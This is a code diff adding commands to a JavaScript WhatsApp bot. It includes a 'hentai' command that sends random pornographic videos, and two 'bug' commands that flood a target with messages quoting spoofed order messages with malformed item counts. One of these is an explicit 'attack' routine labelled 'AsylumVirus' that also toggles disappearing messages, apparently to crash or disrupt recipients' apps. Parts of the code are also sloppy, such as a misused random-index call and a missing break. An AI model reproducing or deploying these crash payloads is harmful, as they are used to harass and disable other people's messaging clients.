@@ -1,0 +1,84 @@
+case 'hentai': {
+                reply(mess.wait)
+                anu = await hentai()
+                result = anu[Math.floor(Math.random(), anu.length)]
+                alpha.sendMessage(m.chat, { video: { url: result.video_1 }, caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.category}\n⭔ Mimetype : ${result.type}\n⭔ Views : ${result.views_count}\n⭔ Shares : ${result.share_count}\n⭔ Source : ${result.link}\n⭔ Media Url : ${result.video_1}` }, { quoted: m })
+
+
+case 'bugpc2':
+if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
+if (args.length < 1) return reply('Jumlahnya?')
+for (let i = 0; i < args[0]; i++) {
+pemuda.sendMessage(from, `${NamaBot}`, MessageType.extendedText,{
+ quoted: {
+key: {
+participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
+},
+message: {
+orderMessage: {
+itemCount: 99999999,
+status: 1,
+surface: 10,
+orderTitle: `${NamaOwner}`,
+sellerJid: '0@s.whatsapp.net'
+}}}}, 0)
+}
+break
+
+case 'bugtroli3':
+              if (!isOwner && !mek.key.fromMe) 
+     function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+function troli(nomor){
+pemuda.sendMessage(nomor, `â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’
+â–’â–’â–’â–’â–’â–’â–’â–’â–„â–„â–„â–„â–„â–„â–„â–„â–’â–’â–’â–’â–’â–’
+â–’â–’â–ˆâ–’â–’â–’â–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„â–’â–’â–’â–’
+â–’â–ˆâ–â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’
+â–’â–Œâ–â–’â–’â–ˆâ–ˆâ–„â–€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–€â–„â–ˆâ–ˆâ–’â–’â–’
+â–â”¼â–â–’â–’â–ˆâ–ˆâ–„â–„â–„â–„â–ˆâ–ˆâ–„â–„â–„â–„â–ˆâ–ˆâ–’â–’â–’
+â–â”¼â–â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’
+â–â–„â–â–ˆâ–ˆâ–ˆâ–ˆâ”€â–€â–â–â–€â–ˆâ”€â–ˆâ”€â–Œâ–â–ˆâ–ˆâ–„â–’
+â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–â–ˆâ–ˆâ–ˆâ–Œ
+â–’â–’â–ˆâ–€â–€â–ˆâ–ˆâ–„â–ˆâ”€â–„â”€â”€â”€â–â”€â–„â–ˆâ–ˆâ–ˆâ–€â–’
+â–’â–’â–ˆâ–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’
+â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’
+â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’
+â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–â–Œâ–ˆâ–ˆâ–Œâ–’â–’â–’
+â–’â–’â–’â–’â–’â–â–€â–â–’â–Œâ–€â–ˆâ–€â–’â–â–’â–ˆâ–’â–’â–’â–’â–’
+â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–â–’â–’â–’â–’â–Œâ–’â–’â–’â–’â–’
+â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’`, MessageType.extendedText,{
+ quoted: {
+  key: {
+   participant: '0@s.whatsapp.net' // Fake sender Jid
+  },
+  message: {
+    orderMessage: {
+    thumbnail: ofrply,
+    itemCount: -969769349, // Bug
+    status: 1,
+    surface: 1,
+    message: 'â˜ ï¸Asylumâ˜ ï¸',
+    orderTitle: 'AsylumVirus', // Idk what this does
+    sellerJid: '0@s.whatsapp.net' // Seller
+   }
+  }
+ }
+})
+}
+function bug(jid){
+for(let i=0;i < 1;i++){
+var
+WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
+pemuda.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
+}}	
+async function attack(targett){
+bug(targett)
+await sleep(100)
+troli(targett)
+await sleep(100)
+bug(targett)
+}
+
+attack(mek.key.remoteJid)
+break
